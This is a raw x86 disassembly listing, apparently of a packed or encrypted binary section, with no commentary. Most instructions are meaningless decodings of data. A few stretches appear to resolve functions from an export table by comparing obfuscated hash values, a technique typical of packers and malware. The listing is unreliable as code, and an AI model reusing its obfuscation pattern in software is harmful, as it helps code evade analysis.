  414796:	popf   
  414797:	test   DWORD PTR [esi+0x51],esi
  41479a:	or     dl,dh
  41479c:	fist   DWORD PTR [ebx+0xa955f04]
  4147a2:	imul   eax,DWORD PTR [edi-0x54],0xfffffff2
  4147a6:	push   edi
  4147a7:	xor    esi,edi
  4147a9:	pop    eax
  4147aa:	test   BYTE PTR [edi],bl
  4147ac:	popa   
  4147ad:	pop    ebx
  4147ae:	xchg   BYTE PTR [edx],bl
  4147b0:	(bad)  
  4147b1:	jns    0x41475e
  4147b3:	inc    edx
  4147b4:	or     ch,0xc5
  4147b7:	stc    
  4147b8:	es mov ebx,0x8a1cec0e
  4147be:	jnp    0x414791
  4147c0:	adc    DWORD PTR [edi],edi
  4147c2:	and    DWORD PTR [edx-0x59],eax
  4147c5:	or     DWORD PTR [edx],ebp
  4147c7:	cmp    DWORD PTR [edi],eax
  4147c9:	mov    eax,ds:0xdceb1955
  4147ce:	jg     0x414830
  4147d0:	(bad)  
  4147d1:	sbb    ch,cl
  4147d3:	adc    eax,0x38313ca1
  4147d8:	or     dh,dh
  4147da:	leave  
  4147db:	sbb    al,0x37
  4147dd:	and    DWORD PTR ds:0xb3ce3ff,esp
  4147e3:	iret   
  4147e4:	jp     0x41485a
  4147e6:	hlt    
  4147e7:	fsubrp st(0),st
  4147e9:	sbb    eax,0x834a41b4
  4147ee:	mov    bl,BYTE PTR [eax]
  4147f0:	push   ss
  4147f1:	cmc    
  4147f2:	xchg   ebx,esi
  4147f4:	mov    al,ds:0xac4d67d7
  4147f9:	or     al,0x56
  4147fb:	or     eax,0x9a3bfc59
  414800:	ret    0xb21e
  414803:	mov    ds:0x66daabdc,eax
  414808:	push   eax
  414809:	call   0x3357a5f9
  41480e:	loopne 0x414808
  414810:	adc    dh,ah
  414812:	shl    BYTE PTR [ebx],cl
  414814:	test   DWORD PTR [ecx],ebp
  414816:	add    al,ch
  414818:	rcl    BYTE PTR [ecx+0x56],0x88
  41481c:	loop   0x4147e8
  41481e:	cmp    DWORD PTR [edi-0x7ede1d23],edi
  414824:	pop    eax
  414825:	add    ebx,DWORD PTR [ebp+0x2e40c231]
  41482b:	outs   dx,BYTE PTR ds:[esi]
  41482c:	outs   dx,DWORD PTR ds:[esi]
  41482d:	pop    ss
  41482e:	or     esp,DWORD PTR ds:0xc9ab34df
  414834:	enter  0xabc,0x86
  414838:	adc    BYTE PTR [edx],ch
  41483a:	xchg   edx,eax
  41483b:	jne    0x4147ca
  41483d:	out    0x20,al
  41483f:	xchg   BYTE PTR [edi],bh
  414841:	or     edx,DWORD PTR [ebp+0x1aa952b1]
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x4147fa
  414861:	push   edi
  414862:	ins    DWORD PTR es:[edi],dx
  414863:	loope  0x414877
  414865:	jge    0x4148e6
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x414805
  41486d:	dec    edi
  41486e:	test   DWORD PTR [edx-0x24],ebp
  414871:	out    0x51,eax
  414873:	and    bl,ch
  414875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414876:	ret    0x96d3
  414879:	in     eax,0x97
  41487b:	mov    edx,ebp
  41487d:	(bad)  
  41487e:	repnz sub ebx,edx
  414881:	or     ah,cl
  414883:	(bad)  
  414884:	call   0x3c7adf74
  414889:	jae    0x414821
  41488b:	and    ch,ah
  41488d:	mov    ebp,0x116e16d7
  414892:	cs dec esp
  414894:	fcmove st,st(5)
  414896:	mov    ebx,0x8398d39f
  41489b:	xor    DWORD PTR [edx-0x35f33765],ebx
  4148a1:	jno    0x414823
  4148a3:	loop   0x414857
  4148a5:	scas   eax,DWORD PTR es:[edi]
  4148a6:	les    edx,FWORD PTR [esi]
  4148a8:	das    
  4148a9:	mov    al,0x67
  4148ab:	mov    DWORD PTR [ebp+0x49a8cb6e],esp
  4148b1:	addr16 push esp
  4148b3:	loope  0x414846
  4148b5:	mov    bl,0x68
  4148b7:	ss inc ebp
  4148b9:	push   0x52
  4148bb:	mov    bh,BYTE PTR [esp+edi*4]
  4148be:	push   esi
  4148bf:	dec    ecx
  4148c0:	gs in  eax,dx
  4148c2:	adc    al,0x10
  4148c4:	or     DWORD PTR [edx],eax
  4148c6:	and    BYTE PTR [edx+0x38907cb5],ah
  4148cc:	call   0xd87:0xe98f9ff2
  4148d3:	push   0xffffff82
  4148d5:	cmp    esi,esp
  4148d7:	xor    BYTE PTR [ebp+0x54],bl
  4148da:	inc    esp
  4148db:	pop    ss
  4148dc:	xchg   ebx,eax
  4148dd:	mov    ch,0xef
  4148df:	push   esp
  4148e0:	inc    eax
  4148e1:	mov    WORD PTR [ebx*2-0x66d2b656],es
  4148e8:	jl     0x4148bf
  4148ea:	fscale 
  4148ec:	stc    
  4148ed:	fld    QWORD PTR [ebx-0x17]
  4148f0:	enter  0x1168,0x84
  4148f4:	arpl   WORD PTR [ecx+0x4d],dx
  4148f7:	fnstsw WORD PTR [edi+0x14]
  4148fa:	stc    
  4148fb:	dec    esp
  4148fc:	xor    cl,BYTE PTR ss:[ecx-0x74d615d]
  414903:	int3   
  414904:	xchg   edi,eax
  414905:	add    DWORD PTR [ebp-0x1aeb62ec],edi
  41490b:	mov    ebp,0x92d3f0e
  414910:	jle    0x4148e7
  414912:	jmp    DWORD PTR [ebp+ebp*8-0x73]
  414916:	cmp    DWORD PTR [eax+esi*2+0x423454fc],ecx
  41491d:	cdq    
  41491e:	adc    eax,0x871a6f6d
  414923:	adc    BYTE PTR [esi],dl
  414925:	stc    
  414926:	imul   esp,DWORD PTR [ecx+ebp*4-0x1c],0x632c4464
  41492e:	adc    eax,edi
  414930:	add    DWORD PTR [ecx],ebp
  414932:	inc    ebx
  414933:	or     al,BYTE PTR [esi+ecx*1]
  414936:	mov    al,ds:0x7e014a9b
  41493b:	jl     0x4149b5
  41493d:	test   esp,ecx
  41493f:	xor    dl,BYTE PTR [ebx-0x1c2be6f0]
  414945:	mov    si,0xdfde
  414949:	sub    bh,BYTE PTR [edx]
  41494b:	push   esi
  41494c:	loope  0x4149aa
  41494e:	leave  
  41494f:	xchg   ecx,eax
  414950:	and    ch,BYTE PTR [edi+0x68]
  414953:	inc    esp
  414954:	mov    al,0xa4
  414956:	and    eax,ebp
  414958:	or     eax,0xa67e4ff2
  41495d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41495e:	cmp    ebp,DWORD PTR [esi-0x1b11a281]
  414964:	mov    dl,0xe1
  414966:	push   es
  414967:	jecxz  0x4149d0
  414969:	inc    ebx
  41496a:	mov    cl,0x12
  41496c:	clc    
  41496d:	in     al,0x8e
  41496f:	aam    0xb7
  414971:	les    ecx,FWORD PTR [esi+0x64]
  414974:	nop
  414975:	push   ecx
  414976:	int3   
  414977:	push   ebx
  414978:	iret   
  414979:	arpl   ax,bx
  41497b:	cmp    ebp,0x10785917
  414981:	or     eax,0x64c504f2
  414986:	outs   dx,DWORD PTR ds:[esi]
  414987:	or     cl,bh
  414989:	push   0x69
  41498b:	or     DWORD PTR [edi+0x49529573],ecx
  414991:	fistp  DWORD PTR [edi]
  414993:	mov    ebp,DWORD PTR [edx]
  414995:	push   cs
  414996:	out    dx,eax
  414997:	dec    edi
  414998:	in     al,dx
  414999:	add    eax,ebp
  41499b:	cmp    BYTE PTR [edx],al
  41499d:	adc    BYTE PTR [esi+0x45],0x9e
  4149a1:	stos   BYTE PTR es:[edi],al
  4149a2:	add    eax,0x510642ed
  4149a7:	xchg   DWORD PTR [edx-0x22fd7350],esi
  4149ad:	rol    ah,0x42
  4149b0:	and    ebx,ecx
  4149b2:	mov    ebx,DWORD PTR [edx+0x7]
  4149b5:	mov    ebx,0x6b1c96c3
  4149ba:	int3   
  4149bb:	(bad)  
  4149bc:	push   esp
  4149bd:	mov    esi,0xb9acee
  4149c2:	mov    ah,0x40
  4149c4:	call   0xc8f28143
  4149c9:	pop    edx
  4149ca:	addr16 xchg ecx,eax
  4149cc:	and    ecx,DWORD PTR ds:0x19750725
  4149d2:	push   edx
  4149d3:	push   ecx
  4149d4:	adc    WORD PTR [ebp-0x7a7fe382],bp
  4149db:	push   esp
  4149dc:	mov    WORD PTR [ecx+0xdb9cfe9],es
  4149e2:	dec    esp
  4149e3:	pop    eax
  4149e4:	jnp    0x414a1e
  4149e6:	xchg   ebx,eax
  4149e7:	jbe    0x4149ed
  4149e9:	xor    edx,edx
  4149eb:	mov    ds:0xa98c45cd,al
  4149f0:	jae    0x4149bc
  4149f2:	sub    al,0x15
  4149f4:	push   ebp
  4149f5:	inc    ecx
  4149f6:	inc    esp
  4149f7:	stos   BYTE PTR es:[edi],al
  4149f8:	cmp    ecx,DWORD PTR [edi]
  4149fa:	cmp    BYTE PTR [ebx-0x21],al
  4149fd:	add    BYTE PTR [edx],0x85
  414a00:	test   al,0x9
  414a02:	and    eax,0x4fda3e4c
  414a07:	test   BYTE PTR [ecx-0x4cf54bc2],cl
  414a0d:	jne    0x414a55
  414a0f:	stc    
  414a10:	add    DWORD PTR [eax],0x1e990e4c
  414a16:	mov    esi,0x2775eeca
  414a1b:	push   ebx
  414a1c:	mov    ah,0xad
  414a1e:	or     al,dl
  414a20:	cs push ds
  414a22:	sub    al,0x8f
  414a24:	or     BYTE PTR [ebx],al
  414a26:	sub    eax,0xc4939906
  414a2b:	adc    cl,ah
  414a2d:	(bad)  
  414a2e:	fsubr  QWORD PTR [ebx]
  414a30:	cld    
  414a31:	pop    ebx
  414a32:	ss fwait
  414a34:	and    BYTE PTR [ebp-0x66a3768e],0xd9
  414a3b:	clc    
  414a3c:	sub    DWORD PTR [edx+0x37],edx
  414a3f:	stos   DWORD PTR es:[edi],eax
  414a40:	push   cs
  414a41:	mov    dh,0x86
  414a43:	leave  
  414a44:	xchg   ebx,eax
  414a45:	fisttp QWORD PTR [eax-0x52]
  414a48:	xor    esp,ebp
  414a4a:	sbb    ecx,DWORD PTR [edx-0x6]
  414a4d:	or     eax,0xba095b56
  414a52:	mov    ah,0x45
  414a54:	adc    ch,ch
  414a56:	into   
  414a57:	mov    esp,DWORD PTR [ebx+ebx*8]
  414a5a:	leave  
  414a5b:	in     eax,dx
  414a5c:	shl    DWORD PTR ds:0x2d6e4d0,1
  414a62:	cmc    
  414a63:	dec    edx
  414a64:	mov    edx,0xe73fe4d3
  414a69:	xchg   ebp,eax
  414a6a:	mov    dh,0x4f
  414a6c:	dec    esp
  414a6d:	xor    edx,DWORD PTR [ecx-0xe]
  414a70:	dec    ebp
  414a71:	test   eax,0xb6b0b4e
  414a76:	pop    edx
  414a77:	mov    edx,0x41ddbe23
  414a7c:	les    esi,FWORD PTR [ecx]
  414a7e:	call   FWORD PTR [ebp+eax*4-0x5fc045bb]
  414a85:	inc    esp
  414a86:	mov    ds:0xe321e1cb,eax
  414a8b:	rcr    eax,0x7e
  414a8e:	into   
  414a8f:	stos   DWORD PTR es:[edi],eax
  414a90:	lds    esp,FWORD PTR [eax-0x7]
  414a93:	fld    QWORD PTR [esi]
  414a95:	hlt    
  414a96:	push   edi
  414a97:	js     0x414a1c
  414a99:	je     0x414a2b
  414a9b:	test   DWORD PTR [edx+0x278858cc],ebp
  414aa1:	pop    eax
  414aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aa3:	adc    al,0x55
  414aa5:	loope  0x414a5f
  414aa7:	(bad)
  414aab:	jns    0x414a7e
  414aad:	and    ah,dh
  414aaf:	mov    eax,0x204f71da
  414ab4:	fidivr DWORD PTR [ebx-0x5d787dc3]
  414aba:	ret    0x4bc5
  414abd:	out    0x62,al
  414abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ac0:	and    eax,0xd3cc9ec7
  414ac5:	jecxz  0x414b1b
  414ac7:	inc    esi
  414ac8:	popa   
  414ac9:	xchg   ebx,eax
  414aca:	(bad)  
  414acb:	fdivr  QWORD PTR [edi]
  414acd:	jg     0x414a58
  414acf:	dec    eax
  414ad0:	add    eax,0xbfa3e955
  414ad5:	xor    edx,edx
  414ad7:	or     al,0xc0
  414ad9:	cmp    eax,0x1130ca5c
  414ade:	imul   ebp,DWORD PTR [ebx+0x583850b7],0x2fc6f86b
  414ae8:	sub    al,0xcb
  414aea:	mov    ah,0xd9
  414aec:	daa    
  414aed:	sub    al,0x6c
  414aef:	test   eax,0x8144cd0d
  414af4:	xchg   edx,eax
  414af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414af6:	ffreep st(4)
  414af8:	out    0x86,eax
  414afa:	arpl   WORD PTR [esi+0x34],si
  414afd:	push   esp
  414afe:	scas   al,BYTE PTR es:[edi]
  414aff:	jns    0x414b62
  414b01:	dec    edx
  414b02:	cld    
  414b03:	into   
  414b04:	add    al,BYTE PTR [edx]
  414b06:	add    edi,DWORD PTR [edx-0x78]
  414b09:	ds jb  0x414afe
  414b0c:	dec    esi
  414b0d:	mul    esp
  414b0f:	out    dx,al
  414b10:	dec    esp
  414b11:	test   BYTE PTR gs:[edx],0x79
  414b15:	xchg   esi,ebp
  414b17:	(bad)
  414b1a:	fisttp QWORD PTR [esi+0x54e1b069]
  414b20:	xchg   BYTE PTR [ebp-0x20],bl
  414b23:	mov    ebx,0x9a3191c3
  414b28:	mov    esp,?
  414b2a:	pop    edx
  414b2b:	inc    eax
  414b2c:	inc    edx
  414b2d:	cmp    BYTE PTR [edx-0x4f6dec6d],bh
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	mov    ebp,0x5bc4c028
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414c10
  414bc3:	cmp    ah,BYTE PTR [esi]
  414bc5:	icebp  
  414bc6:	scas   al,BYTE PTR es:[edi]
  414bc7:	mov    ah,BYTE PTR [ebx+esi*8+0x21e87fd4]
  414bce:	and    al,0x56
  414bd0:	xchg   ecx,eax
  414bd1:	and    eax,0xfbce613
  414bd6:	mov    ecx,0x8e05c3b0
  414bdb:	fstp   DWORD PTR [esi-0x65a86d1c]
  414be1:	lods   al,BYTE PTR ds:[esi]
  414be2:	mov    eax,0xe01a67e6
  414be7:	pop    ecx
  414be8:	or     BYTE PTR [esi-0x1d22971d],al
  414bee:	sub    dh,BYTE PTR [ebp-0x6824061]
  414bf4:	mov    al,0xe2
  414bf6:	push   eax
  414bf7:	push   es
  414bf8:	mov    ebp,0x5fba3f46
  414bfd:	(bad)  
  414bfe:	imul   ebp,DWORD PTR [ecx+eax*4+0x6a],0xffffff97
  414c03:	inc    ebp
  414c04:	inc    esi
  414c05:	scas   al,BYTE PTR es:[edi]
  414c06:	sbb    eax,DWORD PTR [esi+esi*1]
  414c09:	cli    
  414c0a:	ss push es
  414c0c:	call   0x548bb4a
  414c11:	mov    eax,ds:0xd46e5ad3
  414c16:	sub    ebp,ebp
  414c18:	out    dx,eax
  414c19:	out    0xc1,eax
  414c1b:	xchg   ebx,eax
  414c1c:	pop    ebp
  414c1d:	xchg   ecx,eax
  414c1e:	ror    al,1
  414c20:	add    eax,DWORD PTR [edx-0x37]
  414c23:	push   es
  414c24:	pop    eax
  414c25:	loopne 0x414bcd
  414c27:	and    DWORD PTR [esi*4-0x7394e1c4],esp
  414c2e:	icebp  
  414c2f:	pop    ebx
  414c30:	stos   DWORD PTR es:[edi],eax
  414c31:	or     DWORD PTR [eax+0x46],ecx
  414c34:	stc    
  414c35:	and    eax,0xcd287f9
  414c3a:	inc    edx
  414c3b:	add    BYTE PTR [edx+0x77],bh
  414c3e:	push   edx
  414c3f:	popf   
  414c40:	ror    al,0x9c
  414c43:	inc    eax
  414c44:	pop    ss
  414c45:	pusha  
  414c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c47:	int    0x72
  414c49:	sub    BYTE PTR [ebp+eax*1-0x47],ch
  414c4d:	in     al,dx
  414c4e:	data16 cmp cl,BYTE PTR [edi*4+0x5724edcf]
  414c56:	dec    ebp
  414c57:	xor    al,0xb9
  414c59:	jo     0x414be7
  414c5b:	push   eax
  414c5c:	mov    ds:0x13eb75f,eax
  414c61:	add    ecx,ebx
  414c63:	mov    al,cs:0x81b146bd
  414c69:	(bad)  
  414c6a:	xchg   ebx,eax
  414c6b:	outs   dx,BYTE PTR ds:[esi]
  414c6c:	pop    DWORD PTR [edx+ecx*2-0x2c]
  414c70:	jmp    0x89150c8
  414c75:	push   ebp
  414c76:	shl    ebx,0x32
  414c79:	xor    BYTE PTR [ecx+0x1a5ece25],cl
  414c7f:	jns    0x414c09
  414c81:	daa    
  414c82:	das    
  414c83:	pop    es
  414c84:	xor    bl,ah
  414c86:	loope  0x414cf4
  414c88:	push   edi
  414c89:	call   FWORD PTR [eax-0x45e53646]
  414c8f:	test   al,0xf
  414c91:	clc    
  414c92:	and    cl,ch
  414c94:	rcl    DWORD PTR [edi+0x5b11de6c],0x9f
  414c9b:	adc    edi,eax
  414c9d:	pop    edx
  414c9e:	jnp    0x414cbd
  414ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ca1:	cmp    DWORD PTR [esi-0x116ba59e],esp
  414ca7:	xchg   BYTE PTR [eax-0x31],bl
  414caa:	cld    
  414cab:	fld    TBYTE PTR [esi]
  414cad:	fld    QWORD PTR [ebx+0x17]
  414cb0:	(bad)  
  414cb1:	out    dx,al
  414cb2:	nop
  414cb3:	test   BYTE PTR [ebx-0x3c],ah
  414cb6:	test   BYTE PTR ds:0x71d33faf,0xba
  414cbd:	popf   
  414cbe:	cmp    al,0x5e
  414cc0:	popa   
  414cc1:	push   ebp
  414cc2:	(bad)  
  414cc3:	in     al,0x43
  414cc5:	sub    DWORD PTR [edx-0x3d],esi
  414cc8:	dec    esi
  414cc9:	inc    edx
  414cca:	mov    dh,BYTE PTR ds:[ebp-0x57]
  414cce:	xor    DWORD PTR [ebp+ebp*1-0x20],0xffffffe4
  414cd3:	call   0x7971fa22
  414cd8:	pusha  
  414cd9:	fmul   QWORD PTR [esi+edx*8+0x30]
  414cdd:	push   es
  414cde:	pop    ss
  414cdf:	nop
  414ce0:	adc    eax,0x5d7ed2f2
  414ce5:	jae    0x414cfa
  414ce7:	lock ret 
  414ce9:	xor    esi,DWORD PTR [edi+0x223884d6]
  414cef:	rcr    BYTE PTR ds:0xb5879577,0x34
  414cf6:	push   eax
  414cf7:	add    bh,BYTE PTR [eax-0x1]
  414cfa:	add    DWORD PTR [ecx],edi
  414cfc:	(bad)  
  414cff:	xor    DWORD PTR [edx+0x6e0ec45e],ebx
  414d05:	xor    BYTE PTR [ebx-0xb],ch
  414d08:	mov    BYTE PTR [ebx-0x2e142b8b],ch
  414d0e:	mov    ch,BYTE PTR [eax]
  414d10:	fisttp DWORD PTR [edx+0x6c61171b]
  414d16:	cmp    esi,DWORD PTR [esi]
  414d18:	push   ds
  414d19:	cwde   
  414d1a:	mov    eax,ds:0xefba072d
  414d1f:	mov    bh,0xa9
  414d21:	mov    DWORD PTR [ecx-0x6bc91b0],esi
  414d27:	int    0x17
  414d29:	push   edi
  414d2a:	ins    BYTE PTR es:[edi],dx
  414d2b:	pop    ss
  414d2c:	stc    
  414d2d:	sub    eax,0x8c47aafd
  414d32:	pushf  
  414d33:	sub    eax,DWORD PTR [ecx]
  414d35:	sub    esi,DWORD PTR [esi-0x6]
  414d38:	jns    0x414d67
  414d3a:	mov    esi,ebp
  414d3c:	adc    BYTE PTR [ebx-0x2e4968a3],dh
  414d42:	pop    es
  414d43:	xor    DWORD PTR [eax-0x25],0x8614314c
  414d4a:	ins    DWORD PTR es:[edi],dx
  414d4b:	imul   esi,DWORD PTR ds:0x38c56480,0xa01bed51
  414d55:	inc    esi
  414d56:	xlat   BYTE PTR ds:[ebx]
  414d57:	fmul   st,st(7)
  414d59:	std    
  414d5a:	mov    WORD PTR [ecx],fs
  414d5c:	xor    eax,0x974bfd71
  414d61:	xchg   ecx,eax
  414d62:	in     al,dx
  414d63:	lea    edx,[edi+edx*4]
  414d66:	sub    eax,0x7a3829cf
  414d6b:	(bad)  
  414d6c:	sti    
  414d6d:	push   ebx
  414d6e:	jbe    0x414dda
  414d70:	sbb    bh,BYTE PTR [edx+0x45]
  414d73:	jbe    0x414d14
  414d75:	sar    DWORD PTR [ebp+0x191f36e5],1
  414d7b:	mov    cl,0x4c
  414d7d:	mov    edx,0x49dbebe1
  414d82:	sbb    al,BYTE PTR [ebp-0x53]
  414d85:	xchg   ebp,eax
  414d86:	adc    ebx,esp
  414d88:	sub    DWORD PTR [ebx-0x2f],esp
  414d8b:	cmp    al,0x4b
  414d8d:	mov    edx,0x265bd3ae
  414d92:	or     DWORD PTR [esi-0x72],esp
  414d95:	aaa    
  414d96:	cwde   
  414d97:	xor    DWORD PTR [eax+0x21931acb],ebx
  414d9d:	adc    al,dl
  414d9f:	loope  0x414d91
  414da1:	ret    0x7853
  414da4:	(bad)  
  414da5:	adc    al,0x83
  414da7:	sbb    dh,dh
  414da9:	pop    ecx
  414daa:	(bad)  
  414dab:	cli    
  414dac:	mov    cl,0x19
  414dae:	(bad)  [edi]
  414db0:	xchg   ebx,eax
  414db1:	push   ebx
  414db2:	lock lds ebp,FWORD PTR [esi*2-0x4232b771]
  414dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dbb:	adc    al,0x4e
  414dbd:	jge    0x414e36
  414dbf:	scas   eax,DWORD PTR es:[edi]
  414dc0:	and    eax,0xa073cc61
  414dc5:	lods   eax,DWORD PTR ds:[esi]
  414dc6:	add    eax,0x59106a20
  414dcb:	push   eax
  414dcc:	popa   
  414dcd:	push   es
  414dce:	retf   0x6d49
  414dd1:	out    0x23,al
  414dd3:	sbb    BYTE PTR [eax-0x14],0xe4
  414dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dd8:	(bad)  
  414ddb:	les    ecx,FWORD PTR [ebx+edi*1]
  414dde:	out    0xb4,al
  414de0:	out    0x94,al
  414de2:	ret    
  414de3:	pop    esi
  414de4:	cli    
  414de5:	mov    esp,edi
  414de7:	sub    eax,0x72d02f8b
  414dec:	xchg   ebx,eax
  414ded:	(bad)  
  414dee:	sub    BYTE PTR [ecx],0x5d
  414df1:	shl    BYTE PTR [esi+0x755f153d],cl
  414df7:	fstp   TBYTE PTR [eax+0x3136e298]
  414dfd:	pop    ebx
  414dfe:	xor    al,0x69
  414e00:	lock clc 
  414e02:	pop    esp
  414e03:	rol    ah,0xc6
  414e06:	leave  
  414e07:	das    
  414e08:	pop    es
  414e09:	pop    ebx
  414e0a:	add    esi,DWORD PTR [eax]
  414e0c:	popa   
  414e0d:	jno    0x414d97
  414e0f:	push   esp
  414e10:	jno    0x414e3d
  414e12:	(bad)  
  414e14:	mov    esi,eax
  414e16:	ficomp WORD PTR [edi+ecx*1+0x67be6e2c]
  414e1d:	pop    ds
  414e1e:	scas   al,BYTE PTR es:[edi]
  414e1f:	or     cl,bh
  414e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e22:	and    BYTE PTR [edx+0x29],0xa0
  414e26:	xchg   DWORD PTR [edx+ecx*2-0x1542e618],edx
  414e2d:	clc    
  414e2e:	inc    edx
  414e2f:	iret   
  414e30:	inc    ebp
  414e31:	test   eax,0xd5072ce3
  414e37:	mov    bl,0xe6
  414e39:	jmp    0x5d6d:0xef6a862f
  414e40:	loopne 0x414df4
  414e42:	inc    ebx
  414e43:	hlt    
  414e44:	lods   eax,DWORD PTR ds:[esi]
  414e45:	mov    BYTE PTR [eax],bl
  414e47:	outs   dx,BYTE PTR ds:[esi]
  414e48:	dec    esi
  414e49:	jmp    0xc732b47e
  414e4e:	ds jle 0x414eb3
  414e51:	retf   0xb118
  414e54:	call   0x2dfe2d8b
  414e59:	inc    DWORD PTR [ecx+0x578ff642]
  414e5f:	repz and al,BYTE PTR [edi-0x4ce1b75b]
  414e66:	xchg   edx,eax
  414e67:	pop    edi
  414e68:	adc    al,al
  414e6a:	or     ch,BYTE PTR [eax+0x41]
  414e6d:	ins    BYTE PTR es:[edi],dx
  414e6e:	scas   al,BYTE PTR es:[edi]
  414e6f:	ret    
  414e70:	je     0x414e6f
  414e72:	fwait
  414e73:	sub    ah,dl
  414e75:	inc    esp
  414e76:	stos   BYTE PTR es:[edi],al
  414e77:	dec    esp
  414e78:	stos   DWORD PTR es:[edi],eax
  414e79:	push   eax
  414e7a:	cmp    ecx,DWORD PTR [edi-0x56]
  414e7d:	adc    ebx,edi
  414e7f:	adc    bh,ah
  414e81:	push   ecx
  414e82:	or     al,0x3c
  414e84:	fdiv   QWORD PTR es:[edi+0x6a59838b]
  414e8b:	add    eax,0xcb875b49
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	idiv   BYTE PTR [edx+0x7e]
  414eaf:	icebp  
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414efd
  414eb9:	lods   eax,DWORD PTR ds:[esi]
  414eba:	mov    WORD PTR [ecx-0x8],cs
  414ebd:	cli    
  414ebe:	push   0xffffffc2
  414ec0:	mov    WORD PTR [esi-0x13aba2cb],ds
  414ec6:	inc    eax
  414ec7:	mov    bh,0xee
  414ec9:	sub    DWORD PTR [esi+0x12],0xb6ca9f8
  414ed0:	in     eax,dx
  414ed1:	enter  0xb012,0xe
  414ed5:	adc    DWORD PTR [edi+0x24],edi
  414ed8:	fdivr  st(4),st
  414eda:	xor    eax,0x63255123
  414edf:	enter  0xf787,0xdb
  414ee3:	pop    DWORD PTR [ecx]
  414ee5:	(bad)
  414eea:	xor    BYTE PTR [eax],0xef
  414eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eee:	or     eax,0x1dc477ed
  414ef3:	and    ebx,DWORD PTR [ebp-0x1456b494]
  414ef9:	cwde   
  414efa:	mul    BYTE PTR ds:0x25d55fc9
  414f00:	xlat   BYTE PTR ds:[ebx]
  414f01:	je     0x414ea1
  414f03:	(bad)  
  414f04:	sub    eax,0x74c8e9c7
  414f09:	aas    
  414f0a:	fadd   DWORD PTR [ebx-0x4c]
  414f0d:	fbstp  TBYTE PTR [eax+edx*8]
  414f10:	pinsrw mm6,WORD PTR [ecx],0xf6
  414f14:	mov    ebp,0xbf9eff2c
  414f19:	stos   BYTE PTR es:[edi],al
  414f1a:	xchg   esp,eax
  414f1b:	fadd   QWORD PTR [edx-0x5bfdf985]
  414f21:	out    dx,al
  414f22:	adc    al,BYTE PTR [edi]
  414f24:	cmp    BYTE PTR [ebx],bl
  414f26:	push   es
  414f27:	jmp    0x414f48
  414f29:	xchg   BYTE PTR [eax-0x10],dh
  414f2c:	mov    al,ds:0xe60bf0eb
  414f31:	dec    ebp
  414f32:	pop    ebx
  414f33:	push   ebp
  414f34:	pop    edx
  414f35:	rcl    BYTE PTR [edi],cl
  414f37:	int3   
  414f38:	adc    al,0x76
  414f3a:	fs push edi
  414f3c:	push   0x57de575e
  414f41:	mov    DWORD PTR [eax-0x496367fd],edi
  414f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f48:	dec    ecx
  414f49:	push   edx
  414f4a:	popf   
  414f4b:	mov    ebp,0xbea7c176
  414f50:	cmp    DWORD PTR [edx+0x21],0xcd453f04
  414f57:	pop    eax
  414f58:	jbe    0x414ede
  414f5a:	test   eax,0x4865a1a4
  414f5f:	add    edx,ebp
  414f61:	inc    edi
